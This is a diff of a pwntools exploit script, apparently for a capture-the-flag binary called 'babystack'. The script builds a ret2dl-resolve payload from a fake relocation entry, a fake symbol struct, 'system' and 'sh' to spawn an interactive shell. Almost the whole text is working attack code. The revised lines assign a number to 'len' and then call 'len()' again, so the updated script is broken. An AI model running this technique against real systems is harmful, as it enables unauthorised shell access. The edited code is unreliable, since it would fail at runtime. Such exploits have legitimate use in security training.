@@ -4,7 +4,7 @@ fun_addr = 0x804843b
 from pwn import *
 
 elf = ELF("./babystack")
-r = elf.process()
+p = elf.process()
 # gdb.attach(p)
 
 '''
@@ -65,14 +65,14 @@ buffer2 += elf32_rel		# (buf+0x14)
 buffer2 += "A" * align
 buffer2 += elf32_sym_struct 	# (buf+0x20)
 buffer2 += "system\x00"
-p = (100 - len(buffer2))
-buffer2 += "A" * p
+len = (100 - len(buffer2))
+buffer2 += "A" * len
 buffer2 += "sh\x00"
-p = (0x80 - len(buffer2)) 
-buffer2 += "A" * p
+len = (0x80 - len(buffer2)) 
+buffer2 += "A" * len
 
 payload = buffer + buffer2
 
-r.send(payload) 
-r.interactive()
+p.send(payload) 
+p.interactive()
 
